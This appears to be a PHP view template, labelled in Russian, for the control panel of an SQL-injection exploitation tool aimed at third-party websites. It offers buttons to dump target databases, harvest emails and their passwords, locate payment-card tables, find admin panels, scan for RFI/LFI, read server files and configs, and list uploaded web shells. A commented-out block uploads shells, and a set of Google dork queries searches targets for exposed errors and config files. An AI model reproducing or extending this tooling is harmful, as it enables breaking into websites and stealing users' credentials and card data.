	<!-- START CONTENT -->
	
	<?
//echo "<pre>";
	//print_r($inject);
	//echo 123;
	//echo "</pre>";
	//exit;
	//echo 111111;
	?>
	<div id="content">
	

	
		<div class="page_block">
			
			
			<table class="table">
			<thead>
				<th class="center" colspan="3">Информация по сайту</th>
			</thead>
			<tbody>
				<tr>
					<td colspan="1" class="center">САЙТ:</td>
						
			
					
					<td colspan="2" class="center">
					<?
			
			
						//$f = parse_url($inject['posts_one']['gurl']);
						$g = $inject['posts_one']['domen'];
						echo "<a target='_blank' href='http://$g' />$g</a>";?>
					<br/>
					</td>
				</tr>	
				
				<tr>
					<td colspan="1" class="center">ЛИНК:</td>
					<td colspan="2" class="center"> <? 
					$url = $inject['posts_one']['url'];
				echo "<a target='_blank' href='http://$url'>$url</a>";?></td>
				</tr>
				
				<tr>
					<td colspan="1" class="center">IP адресс:</td>
					<td colspan="2" class="center"> <? 
					$ip  = gethostbyname($g);
					echo $ip;?></td>
				</tr>
				
				<tr>
					<td colspan="1" class="center">HTTP метод:</td>
					<td colspan="2" class="center"> <? 
					$http  = $inject['posts_one']['http'];
					echo $http;?></td>
				</tr>
				
				
				<tr>
					<td colspan="1" class="center">GET или POST или HEAD:</td>
					<td colspan="2" class="center"> <? 
					$http  = $inject['posts_one']['header'];
					echo $http;?></td>
				</tr>
				
				
				<tr>
					<td colspan="1" class="center">Версия: </td>
					<td colspan="2" class="center"><?=$inject['posts_one']['version']?></td>
					</td>
				</tr>	
				
				<tr>
					<td colspan="1" class="center">Колонки:</td>
					<td colspan="2" class="center"><?=$inject['posts_one']['work']?></td>
					</td>
				</tr>	
				
				<tr>
					<td colspan="1" class="center">Метод:</td>
					<td colspan="2" class="center"><?=$inject['posts_one']['find']?></td>
					</td>
				</tr>	
				
				<tr>
					<td colspan="1" class="center">Права:</td>
					<td colspan="2" class="center"><?=$inject['posts_one']['file_priv'];?></td>
					</td>
				</tr>	
				
				<?
			if($inject['posts_one']['path1'] !='0')
			{
			?>
				<tr>
					<td colspan="1" class="center">PATH1:</td>
					<td colspan="1" class="center"><?=$inject['posts_one']['path1'];?></td>
					<td colspan="1" class="center"><?=$inject['posts_one']['site1'];?></td>
					</td>
				</tr>	
				
			 <?
			 }
			 ?>
			
			<?
			if($inject['posts_one']['path2'] !='0')
			{
			?>
				<tr>
					<td colspan="1" class="center">PATH2:</td>
					<td colspan="1" class="center"><?=$inject['posts_one']['path2'];?></td>
					<td colspan="1" class="center"><?=$inject['posts_one']['site2'];?></td>
					</td>
				</tr>	
				
			 <?
			 }
			 ?>
			 
			 <?
			if($inject['posts_one']['path3'] !='0')
			{
			?>
				<tr>
					<td colspan="1" class="center">PATH3:</td>
					<td colspan="1" class="center"><?=$inject['posts_one']['path3'];?></td>
					<td colspan="1" class="center"><?=$inject['posts_one']['site3'];?></td>
					</td>
				</tr>	
				
			 <?
			 }
			 ?>
			 
			 
			 
			 
			 <?
			if($inject['posts_one']['path_conf1'] !='0')
			{
			?>
				<tr>
					<td colspan="1" class="center">PATH_CONF1:</td>
					<td colspan="2" class="center"><?=$inject['posts_one']['path_conf1'];?></td>
					
					</td>
				</tr>	
				
			 <?
			 }
			 ?>
			
			<?
			if($inject['posts_one']['path_conf2'] !='0')
			{
			?>
				<tr>
					<td colspan="1" class="center">PATH_CONF1:</td>
					<td colspan="2" class="center"><?=$inject['posts_one']['path_conf2'];?></td>
					
					</td>
				</tr>	
				
			 <?
			 }
			 ?>
			 
			 <?
			if($inject['posts_one']['path_conf3'] !='0')
			{
			?>
				<tr>
					<td colspan="1" class="center">PATH_CONF1:</td>
					<td colspan="2" class="center"><?=$inject['posts_one']['path_conf3'];?></td>
					
					</td>
				</tr>	
				
			 <?
			 }
			 ?>
			 
			 
				
				<tr>
					<td colspan="1" class="center">ФАЙЛЫ:</td>
					<td colspan="2" class="center">
					<?
					$ndirct = $_SERVER['DOCUMENT_ROOT']."/app/webroot/shells/{$g}/"; 
					$nhdl=opendir($ndirct); 
					
					while ($nfile = readdir($nhdl)) 
					{ 
						if (($nfile!=".")&&($nfile!="..")) 
							{ 
							if(filesize($ndirct.$nfile)>10)
							{
							echo "<a target='_blank' href='/shells/$g/$nfile'>$nfile</a> || ";
							}
						} 
					} 
					closedir($nhdl); 
			
			
			?>
					</td>
					</td>
				</tr>	
		
			</table>	
			

			
			
			<?if(trim(@$inject['posts_one']['logs'])!==''){?> [!] <?}?>
		</div>
		<br/>
		<table  width="600px" class="table">
			<thead>
				<th class="center" colspan="2">Получить бд,таблицы,колонки,данные</th>
			</thead>
			
		
			
			</div>
			
			
			
			<div> Что скачать выбранную таблицу, то нажмите сначала "НАЙТИ МЫЛА" качайте 3 максимум 4 колонки, первой выберите EMAIL колонк, качает в webroot/dumping_one</div>
			
			
			<tbody>
				<tr>
					<td colspan="2" class="center">
						<?=$ajax->link('|Найти все БД|', 'getbd_one/'.$this->params['pass']['0'],array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'bds'))?>
						
						<?=$ajax->link('|Найти мыла|', 'getcountmail_one/'.$this->params['pass']['0'],array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'emails'))?>
						
						<?=$ajax->link('|Найти ПАССЫ к мылам|', 'getcountmail_one_pass/'.$this->params['pass']['0'],array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'emails'))?>
						
						<?=$ajax->link('|Найти карты(col)|', 'FindOrder_one/'.$this->params['pass']['0'],array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'orders'))?>
						
						<?=$ajax->link('|Найти карты(tabl)|', 'FindOrderTable_one/'.$this->params['pass']['0'],array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'ordersTable'))?>
						
						<?=$ajax->link('|Вывести|', 'getcooldata_one',array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'cont'))?>
						
						
						<?=$ajax->link('|Сдампить|', 'getdump_one',array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'cont'))?>
						
						
						
						<?=$this->Html->link('|Обновить|', 'krutaten_one/'.$this->params['pass']['0'].'/load/1',array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>''))?>
						
						
						
						
					</td>
				</tr>
				
				<tr>
					<td colspan="2" class="center">
						
						<?=$ajax->link('|Найти админку|', 'findadmin/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'findadmin'))?>
						
						<?=$ajax->link('|Найти админов|', 'search_admin/'.$this->params['pass']['0'],array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'bds'))?>
						
						
						<?=$ajax->link('|Найти папки|', 'finddirs/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'findphpmyadmin'))?>
						
						<?=$ajax->link('|Найти файлы|', 'findfiles/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'findphpmyadmin'))?>
						
						
						<?=$ajax->link('|Найти rfi|', 'findrfi/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'bds'))?>
						
						<?=$ajax->link('|Найти lfi|', 'findlfi/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'bds'))?>
						
						<?//=$ajax->link('|Найти xss|', 'findlfi/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'bds'))?>
						
						
						
						
				</td>
				</tr>			
				<tr>
					<td colspan="2" class="center">	
						
						<? 
							echo $ajax->link('|system|', 'search_system/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('|logs|', 'search_logs/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('|httpd vhost|', 'search_httpd/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('|Найти Пути(index.php)|', 'search_path/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('|Найти Пути(куки)|', 'search_path_cookies/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						
						<? 
							echo $ajax->link('|Найти конфиги|', 'search_path_config/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'config_shell'));
						?>
						
						
						
						
					</td>
				</tr>	
				
				
				<tr>
					<td colspan="2" class="center">	
						
						<? 
							//echo $ajax->link('|Найти поддомены|', 'search_system/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							//echo $ajax->link('|Найти reverse-ip|', 'search_logs/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							//echo $ajax->link('|Запустить паука|', 'search_logs/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							//echo $ajax->link('|Просканить порты|', 'search_logs/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							//echo $ajax->link('|Фаззинг ЧПУ|', 'search_logs/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						
					</td>
				</tr>	
				
				<tr>
					<td colspan="2" class="center">	
						
						<? 
							echo $ajax->link('|Определить cms|', 'search_system/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('|PR,alexa,whois|', 'search_system/'.$g,array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						
						
					</td>
				</tr>	
				
				
				
				<tr>
				
				<!--
					<td  colspan="3" class="center">
						<? 
							echo $ajax->link('залить шелл site1|', 'upload_shell/'.$g.'/1',array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('залить шелл site2|', 'upload_shell/'.$g.'/2',array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
						
						<? 
							echo $ajax->link('залить шелл site3|', 'upload_shell/'.$g.'/3',array('class'=>'btn btn_red','indicator'=>'work','escape' => false,'update'=>'read_file'));
						?>
					</td>
					
				--!>	
				</tr>
				<tr>
					<td  colspan="3" class="center">
						<form action="/posts/file_path1" method="POST" target="_blank">
						<input name="file_path1" type="text"></input>
						<input name="domen" type="hidden" value="<?=$g;?>"></input>
						<input name="sub" type="submit" value="PATH1;сайт1"></input>
						</form>
					
					
					
					
						<form action="/posts/file_path2" method="POST" target="_blank">
						<input name="file_path2" type="text"></input>
						<input name="domen" type="hidden" value="<?=$g;?>"></input>
						<input name="sub" type="submit" value="PATH2;сайт2"></input>
						</form>

					
					
						<form action="/posts/file_path3" method="POST" target="_blank">
						<input name="file_path3" type="text"></input>
						<input name="domen" type="hidden" value="<?=$g;?>"></input>
						<input name="sub" type="submit" value="PATH3;сайт3"></input>
						</form>
					</td>
					
				</tr>	
				<tr>
				
					<td colspan="2" class="center">
						<form action="/posts/file_path_read" method="POST" target="_blank">
						<input name="file_path" type="text"></input>
						<input name="domen" type="hidden" value="<?=$g;?>"></input>
						<input name="sub" type="submit" value="Прочитать файл"></input>
						</form>
					</td>
				</tr>	
				
				<tr>
				
					<td colspan="2" class="center">
						<form action="/posts/file_cookies" method="POST" target="_blank">
						<input name="file_cookies" type="text" value="<?=$inject['posts_one']['cookies'];?>"></input>
						<input name="domen" type="hidden" value="<?=$g;?>"></input>
						<input name="sub" type="submit" value="Установить куки"></input>
						</form>
					</td>
				</tr>	
				
				
				
				
				
				<tr>
					<td colspan="2" class="center">
					google hacking
				
					<? 
					
					//intitle:admin intitle:logins
					//intitle:admin intitle:login

					//intitle:index.of config.php
							$id =$g ;
							$g1 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intext:error";
							
							$g2 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intext:require_";
							
							$g3 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intext:mysql_";
							
							$g4 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intext:fopen";
							
							$g5 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intext:at line";
							
							$g6 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intitle:index of mysql.conf OR mysql_config";
							
							$g7 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intitle:admin+intitle:login";
							
							$g8 = "https://www.google.ru/#newwindow=1&q=site:{$id}+access denied for user+using password";
							
							$g9 = "https://www.google.ru/#newwindow=1&q=site:{$id}+intitle:phpinfo()";
							
								
								echo "<a target='_blank' href='$g1'>G1</a> ||";
								
								echo "<a target='_blank' href='$g2'>G2</a> ||";
								
								echo "<a target='_blank' href='$g3'>G3</a> ||";
								
								echo "<a target='_blank' href='$g4'>G4</a> ||";
								
								echo "<a target='_blank' href='$g5'>G5</a> ||";
								
								echo "<a target='_blank' href='$g6'>G6</a> ||";
								
								echo "<a target='_blank' href='$g7'>G7</a> ||";
								
								echo "<a target='_blank' href='$g8'>G8</a> ||";
								
								echo "<a target='_blank' href='$g9'>G9</a> ||";
						?>
					</td>
				</tr>	

				
					<tr>
					
				<tr>	
					<td id="read_file" colspan="3" >
						<? if(isset($inject['read_file'])){ ?>
							<?=$this->element('read_file',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>		
					
					
				<tr>	
					<td id="findphpmyadmin" colspan="3" >
						<? if(isset($inject['findphpmyadmin'])){ ?>
							<?=$this->element('findphpmyadmin',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>	
				<tr>
					<td id="findadmin" colspan="3" >
						<? if(isset($inject['findadmin'])){ ?>
							<?=$this->element('findadmin',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>
				
				<tr>
					
					<td id="config_shell" colspan="3" >
						<? if(isset($inject['config_shell'])){ ?>
							<?=$this->element('config_shell',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>
				
				
				<tr>
					
					<td id="emails" colspan="3" >
						<? if(isset($inject['emails'])){ ?>
							<?=$this->element('emailone',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>
				
				
				<tr>
					
					<td id="orders" colspan="2" >
						<? if(isset($inject['orders'])){ ?>
							<?=$this->element('orderone',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>
				
				
				<tr>
					
					<td id="ordersTable" colspan="2" >
						<? if(isset($inject['ordersTable'])){ ?>
							<?=$this->element('orderTableone',array('data'=>$inject))?>
						<?}?>
					</td>
				</tr>
				
				
				
				
				
				<tr>
					<td id="bds" width="30%" class="va-top">
						<? if(isset($inject['bds'])){ ?>
							<?=$this->element('dataone',array('data'=>$inject))?>
						<?}?>
					</td>
					
					
					<td width="70%" class="va-top">
						<?=$ajax->remoteTimer(array('url' => array( 'controller' => 'posts', 'action' => 'viewdata_one'),'update' => 'datacool',false,'frequency' => 2))?>
						<div id="field">
							<?php 
							echo $this->element('fieldone');
							?>
						</div>
						<div id="cont"></div>
					</td>
					
					
				</tr>
			</tbody>
		</table>
		<br/>
		<?=$ajax->link('Очистить логи', 'clearUrl',array('class'=>'btn_simple btn_red page_btn fr','indicator'=>'work','escape' => false))?>
		<div class="clear"></div>
		<?php if(count($urls)>0){ $urrrl = ''; foreach ($urls as $value) $urrrl .= $value."\n\r"; }else $urrrl ='';?>
		<?=$ajax->remoteTimer(array('url' => array( 'controller' => 'posts', 'action' => 'urls'),'update' => 'logs',false,'frequency' => 2))?>
		<?=$form->textarea('logs',array('value'=>$urrrl,'id'=>'logs','style'=>'width:100%;height:200px'))?>
	</div>
	<!-- STOP CONTENT -->